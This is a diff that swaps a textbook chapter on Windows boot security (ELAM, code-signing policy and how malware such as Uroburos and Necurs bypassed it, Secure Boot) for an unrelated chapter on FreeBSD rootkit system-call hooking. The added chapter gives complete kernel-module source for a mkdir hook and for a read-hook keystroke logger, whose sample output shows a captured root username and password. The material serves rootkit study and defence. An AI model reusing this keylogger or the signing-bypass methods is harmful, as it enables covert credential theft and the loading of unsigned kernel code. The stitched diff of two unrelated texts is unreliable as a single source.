@@ -1,648 +1,676 @@
-                      6
-      Boot Process Securit y
-
-
-
-
-            In this chapter we’ll look at two important
-           security mechanisms implemented in the
-          Microsoft Windows kernel: the Early Launch
-       Anti-Malware (ELAM) module, introduced in
-Windows 8, and the Kernel-Mode Code Signing Policy,
-introduced in Windows Vista. Both mechanisms were
-designed to prevent the execution of unauthorized
-code in the kernel address space, in order to make it
-harder for rootkits to compromise a system. We’ll look
-at how these mechanisms are implemented, discuss
-their advantages and weak points, and examine their
-effectiveness against rootkits and bootkits.
-     The Early Launch Anti-Malware Module
-                 The Early Launch Anti-Malware (ELAM) module is a detection mecha-
-                 nism for Windows systems that allows third-party security software, such as
-                 anti­v irus software, to register a kernel-mode driver that is guaranteed to
-                 execute very early in the boot process, before any other third-party driver
-                 is loaded. Thus, when an attacker attempts to load a malicious component
-                 into the Windows kernel address space, the security software can inspect
-                 and prevent that malicious driver from loading since the ELAM driver is
-                 already active.
-
-                 API Callback Routines
-                 The ELAM driver registers callback routines that the kernel uses to evalu-
-                 ate data in the system registry hive and boot-start drivers. These callbacks
-                 detect malicious data and modules and prevent them from being loaded
-                 and initialized by Windows.
-                     The Windows kernel registers and unregisters these callbacks by imple-
-                 menting the following API routines:
-                     CmRegisterCallbackEx and CmUnRegisterCallback   Register and unregister
-                     callbacks for monitoring registry data
-                     IoRegisterBootDriverCallback and IoUnRegisterBootDriverCallback Register
-                     and unregister callbacks for boot-start drivers
-                     These callback routines use the prototype EX_CALLBACK_FUNCTION, shown
-                 in Listing 6-1.
-
-                 NTSTATUS EX_CALLBACK_FUNCTION(
-                  IN PVOID CallbackContext,
-                  IN PVOID Argument1,          // callback type
-                  IN PVOID Argument2           // system-provided context structure
-                 );
-
-                 Listing 6-1: Prototype of ELAM callbacks
-
-                     The parameter CallbackContext  receives a context from the ELAM
-                 driver once the driver has executed one of the aforementioned callback
-                 routines to register a callback. The context is a pointer to a memory buffer
-                 holding ELAM driver–specific parameters that may be accessed by any of
-                 the callback routines. This context is a pointer that’s also used to store the
-                 current state of the ELAM driver. The argument at  provides the callback
-                 type, which may be either of the following for the boot-start drivers:
-                     BdCbStatusUpdate  Provides status updates to an ELAM driver regarding
-                     the loading of driver dependencies or boot-start drivers
-                     BdCbInitializeImage Used by the ELAM driver to classify boot-start
-                     drivers and their dependencies
-
-
-
-
-70   Chapter 6
-Classification of Boot-Start Drivers
-The argument at  provides information that the operating system uses
-to classify the boot-start driver as known good (drivers known to be legiti-
-mate and clean), unknown (drivers that ELAM can’t classify), and known
-bad (drivers known to be malicious).
-     Unfortunately, the ELAM driver must base this decision on limited data
-about the driver image to classify, namely:
-
-•    The name of the image
-•    The registry location where the image is registered as a boot-start
-     driver
-•    The publisher and issuer of the image’s certificate
-•    A hash of the image and the name of the hashing algorithm
-•    A certificate thumbprint and the name of the thumbprint algorithm
-
-     The ELAM driver doesn’t receive the image’s base address, nor can
-it access the binary image on the hard drive because the storage device
-driver stack isn’t yet initialized (as the system hasn’t finished bootup). It
-must decide which drivers to load based solely on the hash of the image
-and its certificate, without being able to observe the image itself. As a con-
-sequence, the protection for the drivers is not very effective at this stage.
-
-ELAM Policy
-Windows decides whether to load known bad or unknown drivers
-based on the ELAM policy specified in this registry key: HKLM\System\
-CurrentControlSet\Control\EarlyLaunch\DriverLoadPolicy.
-    Table 6-1 lists the ELAM policy values that determine which drivers
-may be loaded.
-
-Table 6-1: ELAM Policy Values
-
- Policy name                           Policy value   Description
- PNP_INITIALIZE_DRIVERS_DEFAULT        0x00           Load known good drivers only.
- PNP_INITIALIZE_UNKNOWN_DRIVERS        0x01           Load known good and
-                                                      unknown drivers only.
- PNP_INITIALIZE_BAD_CRITICAL_DRIVERS   0x03           Load known good, unknown,
-                                                      and known bad critical drivers.
-                                                      (This is the default setting.)
- PNP_INITIALIZE_BAD_DRIVERS            0x07           Load all drivers.
-
-
-    As you can see, the default ELAM policy, PNP_INITIALIZE_BAD_CRITICAL​
-_DRIVERS, allows the loading of bad critical drivers. This means that if a
-critical driver is classified by ELAM as known bad, the system will load it
-
-
-
-
-                                                                    Boot Process Security   71
-                 regardless. The rationale behind this policy is that critical system drivers
-                 are an essential part of the operating system, so any failure in their initial-
-                 ization will render the operating system unbootable; that is, the system
-                 won’t boot unless all its critical drivers are successfully loaded and initial-
-                 ized. This ELAM policy therefore compromises some security in favor of
-                 availability and serviceability.
-                      However, this policy won’t load known bad noncritical drivers, or those
-                 drivers without which the operating system can still successfully load. This
-                 is the main difference between the PNP_INITIALIZE_BAD_CRITICAL_DRIVERS and
-                 PNP_INITIALIZE_BAD_DRIVERS policies: the latter allows all drivers to be loaded,
-                 including known bad noncritical drivers.
-
-                 How Bootkits Bypass ELAM
-                 ELAM gives security software an advantage against rootkit threats but not
-                 against bootkits—nor was it designed to. ELAM can monitor only legiti-
-                 mately loaded drivers, but most bootkits load kernel-mode drivers that use
-                 undocumented operating system features. This means that a bootkit can
-                 bypass security enforcement and inject its code into kernel address space
-                 despite ELAM. In addition, as shown in Figure 6-1, a bootkit’s malicious
-                 code runs before the operating system kernel is initialized and before any
-                 kernel-mode driver is loaded, including ELAM. This means that a bootkit
-                 can sidestep ELAM protection.
-                                                                       ELAM receives control and
-                                                                       checks kernel-mode drivers.
-
-
-
-
-                                            bootmgr                                           Kernel-mode
-                   MBR        VBR/IPL                          OS kernel          ELAM
-                                           winload.exe                                          drivers
-
-
-                                                                                ELAM verifies drivers.
-                             Bootkit is    Bootkit patches    Bootkit injects
-                             loaded.      system modules.     its code into
-                                                               kernel-mode
-                                                             address space.
-
-                                                     The system is compromised.
-
-
-
-                 Figure 6-1: The flow of the boot process with ELAM
-
-                      Most bootkits load their kernel-mode code in the middle of kernel
-                 initialization, once all OS subsystems (the I/O subsystem, object manager,
-                 plug and play manager, and so forth) have been initialized but before
-                 ELAM is executed. ELAM can’t prevent the execution of malicious code
-                 that has been loaded before it, of course, so it has no defenses against boot-
-                 kit techniques.
-
-
-72   Chapter 6
-Microsoft Kernel-Mode Code Signing Policy
-        The Kernel-Mode Code Signing Policy protects the Windows operating
-        system by imposing code-signing requirements for modules meant to be
-        loaded into the kernel address space. This policy has made it much harder
-        for bootkits and rootkits to compromise a system by executing kernel-mode
-        drivers, thus pushing rootkit developers to switch to bootkit techniques
-        instead. Unfortunately, as explained later in the chapter, attackers can dis-
-        able the entire logic of on-load signature verification by manipulating a few
-        variables that correspond to startup configuration options.
-
-        Kernel-Mode Drivers Subject to Integrity Checks
-        The signing policy was introduced in Windows Vista and has been
-        enforced in all subsequent versions of Windows, though it’s enforced
-        differently on 32-bit and 64-bit operating systems. It kicks in when the
-        kernel-mode drivers are loaded so that it can verify their integrity before
-        driver images are mapped into kernel address space. Table 6-2 shows
-        which kernel-mode drivers on 64- and 32-bit systems are subject to which
-        integrity checks.
-
-        Table 6-2: Kernel-Mode Code Signing Policy Requirements
-
-        Driver type                       Subject to integrity checks?
-                                          64-bit      32-bit
-        Boot-start drivers                Yes         Yes
-        Non-boot-start PnP drivers        Yes         No
-        Non-boot-start, non-PnP drivers   Yes         No (except drivers that
-                                                      stream protected media)
-
-
-             As the table shows, on 64-bit systems, all kernel-mode modules, regard-
-        less of type, are subject to integrity checks. On 32-bit systems, the signing pol-
-        icy applies only to boot-start and media drivers; other drivers are not checked
-        (PnP device installation enforces an install-time signing requirement).
-             In order to comply with the code integrity requirements, drivers must
-        have either an embedded Software Publisher Certificate (SPC) digital sig-
-        nature or a catalog file with an SPC signature. Boot-start drivers, however,
-        can have only embedded signatures because at boot time the storage device
-        driver stack isn’t initialized, making the drivers’ catalog files inaccessible.
-
-        Location of Driver Signatures
-        The embedded driver signature within a PE file, such as a boot-start driver,
-        is specified in the IMAGE_DIRECTORY_DATA_SECURITY entry in the PE header data
-        directories. Microsoft provides APIs to enumerate and get information on
-        all the certificates contained in an image, as shown in Listing 6-2.
-
-
-
-
-                                                                         Boot Process Security   73
-                 BOOL ImageEnumerateCertificates(
-                    _In_     HANDLE FileHandle,
-                    _In_     WORD TypeFilter,
-                    _Out_    PDWORD CertificateCount,
-                    _In_out_ PDWORD Indices,
-                    _In_opt_ DWORD IndexCount
-                 );
-                 BOOL ImageGetCertificateData(
-                    _In_    HANDLE FileHandle,
-                    _In_    DWORD CertificateIndex,
-                    _Out_   LPWIN_CERTIFICATE Certificate,
-                    _Inout_ PDWORD RequiredLength
-                 );
-
-                 Listing 6-2: Microsoft’s API for enumerating and validating certificates
-
-                      The Kernel-Mode Code Signing Policy has increased the security
-                 resilience of the system, but it does have its limitations. In the following
-                 sections, we discuss some of those shortcomings and how malware authors
-                 have leveraged them to bypass protections.
-
-
-
-                        Plug a nd Pl ay De v ice Ins ta ll ation Signing Policy
-
-                      In addition to the Kernel-Mode Code Signing Policy, Microsoft Windows has
-                      another type of signing policy: the Plug and Play Device Installation Signing
-                      Policy. It’s important not to confuse the two.
-                            The requirements of the Plug and Play Device Installation Signing Policy
-                      apply only to plug and play (PnP) device drivers and are enforced in order to
-                      verify the identity of the publisher and the integrity of the PnP device driver
-                      installation package. Verification requires that the catalog file of the driver
-                      package be signed either by a Windows Hardware Quality Labs (WHQL)
-                      certificate or by a third-party SPC. If the driver package doesn’t meet the
-                      requirements of the PnP policy, a warning dialog prompts users to decide
-                      whether to allow the driver package to be installed on their system.
-                            System administrators can disable the PnP policy, allowing PnP driver
-                      packages to be installed on a system without proper signatures. Also, note that
-                      this policy is applied only when the driver package is installed, not when the
-                      drivers are loaded. Although this may look like a TOCTOU (time of check to
-                      time of use) weakness, it’s not; it simply means that a PnP driver package that
-                      is successfully installed on a system won’t necessarily be loaded, because these
-                      drivers are also subject to the Kernel-Mode Code Signing Policy check at boot.
-
-
-
-
-                 The Legacy Code Integrity Weakness
-                 The logic in the Kernel-Mode Code Signing Policy responsible for enforc-
-                 ing code integrity is shared between the Windows kernel image and the
-                 kernel-mode library ci.dll. The kernel image uses this library to verify the
-
-74   Chapter 6
-integrity of all modules being loaded into the kernel address space. The key
-weakness of the signing process lies in a single point of failure in this code.
-     In Microsoft Windows Vista and 7, a single variable in the kernel image
-lies at the heart of this mechanism and determines whether integrity checks
-are enforced. It looks like this:
-
-BOOL nt!g_CiEnabled
-
-    This variable is initialized at boot time in the kernel image routine
-NTSTATUS SepInitializeCodeIntegrity(). The operating system checks to see
-if it is booted into the Windows preinstallation (WinPE) mode, and if so,
-the variable nt!g_CiEnabled is initialized with the FALSE (0x00) value, which
-disables integrity checks.
-      So, of course, attackers found that they could easily dodge the integ-
-rity check by simply setting nt!g_CiEnabled to FALSE, which is exactly what
-happened with the Uroburos family of malware (also known as Snake and
-Turla) in 2011. Uroburos bypassed the code-signing policy by introducing
-and then exploiting a vulnerability in a third-party driver. The legitimate
-third-party signed driver was VBoxDrv.sys (the VirtualBox driver), and the
-exploit cleared the value of the nt!g_CiEnabled variable after gaining code
-execution in kernel mode, at which point any malicious unsigned driver
-could be loaded on the attacked machine.
-
-
-
-                            A Linu x V ulne r a bilit y
-
-    This kind of weakness is not unique to Windows: attackers have disabled the
-    mandatory access control enforcement in SELinux in similar ways. Specifically,
-    if the attacker knows the address of the variable containing SELinux’s enforce-
-    ment status, all the attacker needs to do is overwrite the value of that variable.
-    Because SELinux enforcement logic tests the variable’s value before doing any
-    checks, this logic will render itself inactive. A detailed analysis of this vulner-
-    ability and its exploit code can be found at https://grsecurity.net/~spender/
-    exploits/exploit2.txt.
-
-
-
-
-    If Windows isn’t in WinPE mode, it next checks the values of the boot
-options DISABLE_INTEGRITY_CHECKS and TESTSIGNING. As the name suggests,
-DISABLE_INTEGRITY_CHECKS disables integrity checks. A user, on any Windows
-version, can set this option manually at boot with the Boot menu option
-Disable Driver Signature Enforcement. Windows Vista users can also use the
-bcdedit.exe tool to set the value of the nointegritychecks option to TRUE; later
-versions ignore this option in the Boot Configuration Data (BCD) when
-Secure Boot is enabled (see Chapter 17 for more on Secure Boot).
-    The TESTSIGNING option alters the way the operating system verifies the
-integrity of kernel-mode modules. When it’s set to TRUE, certificate vali-
-dation isn’t required to chain all the way up to a trusted root certificate
-
-                                                                       Boot Process Security   75
-                 authority (CA). In other words, any driver with any digital signature can be
-                 loaded into kernel address space. The Necurs rootkit abuses the TESTSIGNING
-                 option by setting it to TRUE and loading its kernel-mode driver, signed with a
-                 custom certificate.
-                     For years, there have been browser bugs that failed to follow the inter-
-                 mediate links in the X.509 certificate’s chains of trust to a legitimate trusted
-                 CA,1 but OS module-signing schemes still don’t eschew shortcuts wherever
-                 chains of trust are concerned.
-
-                 The ci.dll Module
-                 The kernel-mode library ci.dll, which is responsible for enforcing code
-                 integrity policy, contains the following routines:
-                      CiCheckSignedFile   Verifies the digest and validates the digital signature
-                      CiFindPageHashesInCatalog Validates whether a verified system catalog
-                      contains the digest of the first memory page of the PE image
-                      CiFindPageHashesInSignedFile Verifies the digest and validates the digital
-                      signature of the first memory page of the PE image
-                      CiFreePolicyInfo Frees memory allocated by the functions
-                      CiVerifyHashInCatalog, CiCheckSignedFile, CiFindPageHashesInCatalog,
-                      and CiFindPageHashesInSignedFile
-                      CiGetPEInformation Creates an encrypted communication channel
-                      between the caller and the ci.dll module
-                      CiInitialize Initializes the capability of ci.dll to validate PE image file
-                      integrity
-                      CiVerifyHashInCatalog Validates the digest of the PE image contained
-                      within a verified system catalog
-                     The routine CiInitialize is the most important one for our purposes,
-                 because it initializes the library and creates its data context. We can see its
-                 prototype corresponding to Windows 7 in Listing 6-3.
-
-                 NTSTATUS CiInitialize(
-                  IN ULONG CiOptions;
-                    PVOID Parameters;
-                  OUT PVOID g_CiCallbacks;
-                 );
-
-                 Listing 6-3: Prototype of the CiInitialize routine
-
-                     The CiInitialize routine receives as parameters the code integrity
-                 options (CiOptions)  and a pointer to an array of callbacks (OUT PVOID
-                 g_CiCallbacks) , the routines of which it fills in upon output. The kernel
-                 uses these callbacks to verify the integrity of kernel-mode modules.
-
-
-
-
-                 1. See Moxie Marlinspike, “Internet Explorer SSL Vulnerability,” https://moxie.org/ie-ssl-chain.txt.
-
-76   Chapter 6
-     The CiInitialize routine also performs a self-check to ensure that no
-one has tampered with it. The routine then proceeds to verify the integrity
-of all the drivers in the boot-driver list, which essentially contains boot-start
-drivers and their dependencies.
-     Once initialization of the ci.dll library is complete, the kernel uses
-callbacks in the g_CiCallbacks buffer to verify the integrity of the modules.
-In Windows Vista and 7 (but not Windows 8), the SeValidateImageHeader
-routine decides whether a particular image passes the integrity check.
-Listing 6-4 shows the algorithm underlying this routine.
-
-NTSTATUS SeValidateImageHeader(Parameters) {
-   NTSTATUS Status = STATUS_SUCCESS;
-   VOID Buffer = NULL;
- if (g_CiEnabled == TRUE) {
-          if (g_CiCallbacks[0] != NULL)
-           Status = g_CiCallbacks[0](Parameters);
-          else
-             Status = 0xC0000428
-   }
-   else {
-       Buffer = ExAllocatePoolWithTag(PagedPool, 1, 'hPeS');
-          *Parameters = Buffer
-          if (Buffer == NULL)
-             Status = STATUS_NO_MEMORY;
-   }
-   return Status;
+                                      2
+                                   HOOKING
+
+
+
+
+              We’ll start our discussion of kernel-mode
+             rootkits with call hooking, or simply
+            hooking, which is arguably the most popular
+        rootkit technique.
+    Hooking is a programming technique that employs handler functions
+(called hooks) to modify control flow. A new hook registers its address as
+the location for a specific function, so that when that function is called,
+the hook is run instead. Typically, a hook will call the original function at
+some point in order to preserve the original behavior. Figure 2-1 illustrates
+the control flow of a subroutine before and after installing a call hook.
+                Normal Execution                             Hooked Execution
+
+   Function A                  Function B      Function A                  Function B
+
+
+                                                                 Hook
+
+Figure 2-1: Normal execution versus hooked execution
+
+
+
+
+          No Starch Press, Copyright © 2007 by Joseph Kong
+                         As you can see, hooking is used to extend (or decrease) the function-
+                    ality of a subroutine. In terms of rootkit design, hooking is used to alter the
+                    results of the operating system’s application programming interfaces (APIs),
+                    most commonly those involved with bookkeeping and reporting.
+                         Now, let’s start abusing the KLD interface.
+
+     2.1        Hooking a System Call
+                    Recall from Chapter 1 that a system call is the entry point through which an
+                    application program requests service from the operating system’s kernel. By
+                    hooking these entry points, a rootkit can alter the data the kernel returns to
+                    any or every user space process. In fact, hooking system calls is so effective
+                    that most (publicly available) rootkits employ it in some way.
+                         In FreeBSD, a system call hook is installed by registering its address
+                    as the system call function within the target system call’s sysent structure
+                    (which is located within sysent[] ).
+
+           NOTE     For more on system calls, see Section 1.4.
+                         Listing 2-1 is an example system call hook (albeit a trivial one) designed
+                    to output a debug message whenever a user space process calls the mkdir
+                    system call—in other words, whenever a directory is created.
+
+                    #include <sys/types.h>
+                    #include <sys/param.h>
+                    #include <sys/proc.h>
+                    #include <sys/module.h>
+                    #include <sys/sysent.h>
+                    #include <sys/kernel.h>
+                    #include <sys/systm.h>
+                    #include <sys/syscall.h>
+                    #include <sys/sysproto.h>
+
+                    /* mkdir system call hook. */
+                    static int
+                    mkdir_hook(struct thread *td, void *syscall_args)
+                    {
+                            struct mkdir_args /* {
+                                    char    *path;
+                                    int     mode;
+                            } */ *uap;
+                            uap = (struct mkdir_args *)syscall_args;
+
+                             char path[255];
+                             size_t done;
+                             int error;
+
+                             error = copyinstr(uap->path, path, 255, &done);
+                             if (error != 0)
+                                     return(error);
+
+                             /* Print a debug message. */
+
+
+24   C ha pt er 2
+                              No Starch Press, Copyright © 2007 by Joseph Kong
+                uprintf("The directory \"%s\" will be created with the following"
+                    " permissions: %o\n", path, uap->mode);
+
+                return(mkdir(td, syscall_args));
+       }
+
+       /* The function called at load/unload. */
+       static int
+       load(struct module *module, int cmd, void *arg)
+       {
+               int error = 0;
+
+                switch (cmd) {
+                case MOD_LOAD:
+                        /* Replace mkdir with mkdir_hook. */
+                                   
+                          sysent[ SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
+                        break;
+
+                case MOD_UNLOAD:
+                        /* Change everything back to normal. */
+                          
+                          sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;
+                        break;
+
+                default:
+                        error = EOPNOTSUPP;
+                        break;
+                }
+
+                return(error);
+       }
+
+       static moduledata_t mkdir_hook_mod = {
+               "mkdir_hook",           /* module name */
+               load,                   /* event handler */
+               NULL                    /* extra data */
+       };
+
+       DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+
+       Listing 2-1: mkdir_hook.c
+
+            Notice that upon module load, the event handler registers mkdir_hook
+       (which simply prints a debug message and then calls mkdir) as the mkdir system
+       call function. This single line installs the system call hook. To remove the
+                      
+       hook, simply reinstate the original mkdir system call function upon module
+       unload.
+
+NOTE                 
+       The constant SYS_mkdir is defined as the offset value for the mkdir system call.
+       This constant is defined in the <sys/syscall.h> header, which also contains a
+       complete listing of all in-kernel system call numbers.
+
+           The following output shows the results of executing mkdir(1) after
+       loading mkdir_hook.
+
+
+                                                                               H ookin g   25
+                 No Starch Press, Copyright © 2007 by Joseph Kong
+                    $ sudo kldload ./mkdir_hook.ko
+                    $ mkdir test
+                    The directory "test" will be created with the following permissions: 777
+                    $ ls –l
+                    . . .
+                    drwxr-xr-x 2 ghost ghost     512 Mar 22 08:40 test
+
+                         As you can see, mkdir(1) is now a lot more verbose.1
+
+     2.2        Keystroke Logging
+                    Now let’s look at a more interesting (but still somewhat trivial) example of a
+                    system call hook.
+                          Keystroke logging is the simple act of intercepting and capturing a user’s
+                    keystrokes. In FreeBSD, this can be accomplished by hooking the read system
+                    call. 2 As its name implies, this call is responsible for reading in input. Here is
+                    its C library definition:
+
+                    #include <sys/types.h>
+                    #include <sys/uio.h>
+                    #include <unistd.h>
+
+                    ssize_t
+                    read(int fd, void *buf, size_t nbytes);
+
+                        The read system call reads in nbytes of data from the object referenced by
+                    the descriptor fd into the buffer buf. Therefore, in order to capture a user’s
+                    keystrokes, you simply have to save the contents of buf (before returning
+                    from a read call) whenever fd points to standard input (i.e., file descriptor 0).
+                    For example, take a look at Listing 2-2:
+
+                    #include <sys/types.h>
+                    #include <sys/param.h>
+                    #include <sys/proc.h>
+                    #include <sys/module.h>
+                    #include <sys/sysent.h>
+                    #include <sys/kernel.h>
+                    #include <sys/systm.h>
+                    #include <sys/syscall.h>
+                    #include <sys/sysproto.h>
+
+                    /*
+                     * read system call hook.
+                     * Logs all keystrokes from stdin.
+                     * Note: This hook does not take into account special characters, such as
+                     * Tab, Backspace, and so on.
+                     */
+
+
+                    1
+                      For you astute readers, yes, I have a umask of 022, which is why the permissions for “test” are
+                    755, not 777.
+                    2
+                      Actually, to create a full-fledged keystroke logger, you would have to hook read, readv, pread,
+                    and preadv.
+
+26   C ha pt er 2
+                               No Starch Press, Copyright © 2007 by Joseph Kong
+static int
+read_hook(struct thread *td, void *syscall_args)
+{
+        struct read_args /* {
+                int     fd;
+                void    *buf;
+                size_t nbyte;
+        } */ *uap;
+        uap = (struct read_args *)syscall_args;
+
+         int error;
+         char buf[1];
+         int done;
+
+           error = read(td, syscall_args);
+
+         if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
+                return(error);
+         copyinstr(uap->buf, buf, 1, &done);
+         printf("%c\n", buf[0]);
+
+         return(error);
 }
 
-Listing 6-4: Pseudocode of the SeValidateImageHeader routine
+/* The function called at load/unload. */
+static int
+load(struct module *module, int cmd, void *arg)
+{
+        int error = 0;
 
-    SeValidateImageHeader checks to see if the nt!g_CiEnabled variable is set to
-TRUE . If not, it tries to allocate a byte-length buffer  and, if it succeeds,
-returns a STATUS_SUCCESS value.
-    If nt!g_CiEnabled is TRUE, then SeValidateImageHeader executes the first
-callback in the g_CiCallbacks buffer, g_CiCallbacks[0] , which is set to the
-CiValidateImageData routine. The later callback CiValidateImageData verifies
-the integrity of the image being loaded.
+         switch (cmd) {
+         case MOD_LOAD:
+                 /* Replace read with read_hook. */
+                 sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
+                 break;
 
-Defensive Changes in Windows 8
-With Windows 8, Microsoft made a few changes designed to limit the kinds
-of attacks possible in this scenario. First, Microsoft deprecated the kernel
-variable nt!g_CiEnabled, leaving no single point of control over the integrity
-policy in the kernel image as in earlier versions of Windows. Windows 8 also
-changed the layout of the g_CiCallbacks buffer.
-     Listing 6-5 (Windows 7 and Vista) and Listing 6-6 (Windows 8) show
-how the layout of g_CiCallbacks differs between the OS versions.
+         case MOD_UNLOAD:
+                 /* Change everything back to normal. */
+                 sysent[SYS_read].sy_call = (sy_call_t *)read;
+                 break;
 
-typedef struct _CI_CALLBACKS_WIN7_VISTA {
- PVOID CiValidateImageHeader;
- PVOID CiValidateImageData;
+         default:
+                 error = EOPNOTSUPP;
+                 break;
+         }
 
+         return(error);
+}
 
-                                                               Boot Process Security   77
-                  PVOID CiQueryInformation;
-                 } CI_CALLBACKS_WIN7_VISTA, *PCI_CALLBACKS_WIN7_VISTA;
+static moduledata_t read_hook_mod = {
+        "read_hook",            /* module name */
+        load,                   /* event handler */
+        NULL                    /* extra data */
+};
 
-                 Listing 6-5: Layout of g_CiCallbacks buffer in Windows Vista and Windows 7
+DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 
-                     As you can see in Listing 6-5, the Windows Vista and Windows 7 layout
-                 includes just the necessary basics. The Windows 8 layout (Listing 6-6), on
-                 the other hand, has more fields for additional callback functions for PE
-                 image digital signature validation.
+Listing 2-2: read_hook.c
 
-                 typedef struct _CI_CALLBACKS_WIN8 {
-                     ULONG ulSize;
-                     PVOID CiSetFileCache;
-                     PVOID CiGetFileCache;
-                   PVOID CiQueryInformation;
-                   PVOID CiValidateImageHeader;
-                   PVOID CiValidateImageData;
-                     PVOID CiHashMemory;
-                     PVOID KappxIsPackageFile;
-                 } CI_CALLBACKS_WIN8, *PCI_CALLBACKS_WIN8;
+                                                                      H ookin g   27
+          No Starch Press, Copyright © 2007 by Joseph Kong
+                        In Listing 2-2 the function read_hook first calls read to read in the data
+                                                  
+                    from fd. If this data is not a keystroke (which is defined as one character
+                                                                                    
+                    or one byte in size) originating from standard input, then read_hook returns.
+                                                                        
+                    Otherwise, the data (i.e., keystroke) is copied into a local buffer, effectively
+                    “capturing” it.
 
-                 Listing 6-6: Layout of g_CiCallbacks buffer in Windows 8.x
+           NOTE     In the interest of saving space (and keeping things simple), read_hook simply dumps
+                    the captured keystroke(s) to the system console.
 
-                     In addition to the function pointers CiQueryInformation , CiValidate
-                 ImageHeader , and CiValidateImageData , which are present in both
-                 CI_CALLBACKS_WIN7_VISTA and CI_CALLBACKS_WIN8 structures, CI_CALLBACKS_WIN8
-                 also has fields that affect how code integrity is enforced in Windows 8.
+                           Here are the results from logging into a system after loading read_hook:
 
+                    login: root
+                    Password:
+                    Last login: Mon Mar 4 00:29:14 on ttyv2
 
+                    root@alpha ~# dmesg | tail -n 32
+                    r
+                    o
+                    o
+                    t
 
-                                         F ur the r Re a ding on ci.dll
+                    p
+                    a
+                    s
+                    s
+                    w
+                    d
+                    . . .
 
-                      More information on the implementation details of the ci.dll module can be
-                      found at https://github.com/airbus-seclab/warbirdvm. This article delves into
-                      the implementation details of the encrypted memory storage used within ci.dll
-                      module, which may be used by other OS components to keep certain details
-                      and configuration information secret. This storage is protected by a heavily
-                      obfuscated virtual machine (VM), making it much harder to reverse engineer
-                      the storage encryption/decryption algorithm. The authors of the article pro-
-                      vide a detailed analysis of the VM obfuscation method, and they share their
-                      Windbg plug-in for decrypting and encrypting the storage on the fly.
-
-
-
-
-     Secure Boot Technology
-                 Secure Boot technology was introduced in Windows 8 to protect the
-                 boot process against bootkit infection. Secure Boot leverages the Unified
-                 Extensible Firmware Interface (UEFI) to block the loading and execution
-                 of any boot application or driver without a valid digital signature in order
-
-
-78   Chapter 6
-        to protect the integrity of the operating system kernel, system files, and
-        boot-critical drivers. Figure 6-2 shows the boot process with Secure Boot
-        enabled.
-
-                       Secure Boot                                  Code Integrity Protection
-
-                                       bootmgr                                             Kernel-mode
-           BIOS         UEFI                              OS kernel         ELAM
-                                      winload.exe                                            drivers
+                         As you can see, my login credentials—my username (root) and password
+                    (passwd)3—have been captured. At this point, you should be able to hook any
+                    system call. However, one question remains: If you aren’t a kernel guru, how
+                    do you determine which system call(s) to hook? The answer is: you use kernel
+                    process tracing.
 
 
+     2.3        Kernel Process Tracing
+                    Kernel process tracing is a diagnostic and debugging technique used to inter-
+                    cept and record each kernel operation—that is, every system call, namei
+                    translation, I/O, signal processed, and context switch performed on behalf
+                    of a specific running process. In FreeBSD, this is done with the ktrace(1) and
+                    kdump(1) utilities. For example:
+
+                    $ ktrace ls
+                    file1                 file2               ktrace.out
+                    $ kdump
+                       517 ktrace         RET     ktrace 0
 
 
-                      Bootkit is      Bootkit patches    Bootkit injects
-                      loaded.        system modules.     its code into
-                                                          kernel-mode
-                                                        address space.
+                    3
+                        Obviously, this is not my real root password.
 
-        Figure 6-2: The flow of the boot process with Secure Boot
+28   C ha pt er 2
+                                 No Starch Press, Copyright © 2007 by Joseph Kong
+            517 ktrace     CALL    execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)
+            517 ktrace     NAMI    "/sbin/ls"
+            517 ktrace     RET     execve -1 errno 2 No such file or directory
+            517 ktrace     CALL    execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)
+            517 ktrace     NAMI    "/bin/ls"
+            517 ktrace     NAMI    "/libexec/ld-elf.so.1"
+            517 ls         RET     execve 0
+         . . .
+            517 ls         CALL      getdirentries(0x5,0x8054000,0x1000,0x8053014)
+            517 ls         RET     getdirentries 512/0x200
+            517 ls         CALL    getdirentries(0x5,0x8054000,0x1000,0x8053014)
+            517 ls         RET     getdirentries 0
+            517 ls         CALL     lseek(0x5,0,0,0,0)
+            517 ls         RET     lseek 0
+            517 ls         CALL     close(0x5)
+            517 ls         RET     close 0
+            517 ls         CALL     fchdir(0x4)
+            517 ls         RET     fchdir 0
+            517 ls         CALL    close(0x4)
+            517 ls         RET     close 0
+            517 ls         CALL    fstat(0x1,0xbfbfdea0)
+            517 ls         RET     fstat 0
+            517 ls         CALL    break(0x8056000)
+            517 ls         RET     break 0
+            517 ls         CALL    ioctl(0x1,TIOCGETA,0xbfbfdee0)
+            517 ls         RET     ioctl 0
+            517 ls         CALL    write(0x1,0x8055000,0x19)
+            517 ls         GIO     fd 1 wrote 25 bytes
+                "file1               file2           ktrace.out
+                "
+            517 ls         RET     write 25/0x19
+            517 ls         CALL    exit(0)
 
-             When Secure Boot is enabled, the BIOS verifies the integrity of all UEFI
-        and OS boot files executed at startup to ensure that they come from a legiti-
-        mate source and have a valid digital signature. The signatures on all boot-
-        critical drivers are checked in winload.exe and by the ELAM driver as part
-        of Secure Boot verification. Secure Boot is similar to the Microsoft Kernel-
-        Mode Code Signing Policy, but it applies to modules that are executed before
-        the operating system kernel is loaded and initialized. As a result, untrusted
-        components (that is, ones without valid signatures) will not be loaded and
-        will trigger remediation.
-             When the system first starts, Secure Boot ensures that the preboot envi-
-        ronment and bootloader components aren’t tampered with. The bootloader,
-        in turn, validates the integrity of the kernel and boot-start drivers. Once the
-        kernel passes the integrity validations, Secure Boot verifies other drivers and
-        modules. Fundamentally, Secure Boot relies on the assumption of a root of
-        trust—the idea that early in execution, a system is trustworthy. Of course, if
-        attackers manage to execute an attack before that point, they probably win.
-             Over the last few years, the security research community has focused con-
-        siderable attention on BIOS vulnerabilities that can allow attackers to bypass
-        Secure Boot. We’ll discuss these vulnerabilities in detail in Chapter 16 and
-        delve into Secure Boot in more detail in Chapter 17.
+
+  NOTE   In the interest of being concise, any output irrelevant to this discussion is omitted.
+             As the preceding example shows, the ktrace(1) utility enables kernel
+         trace logging for a specific process [in this case, ls(1)], while kdump(1) displays
+         the trace data.
+             Notice the various system calls that ls(1) issues during its execution, such
+                                                 
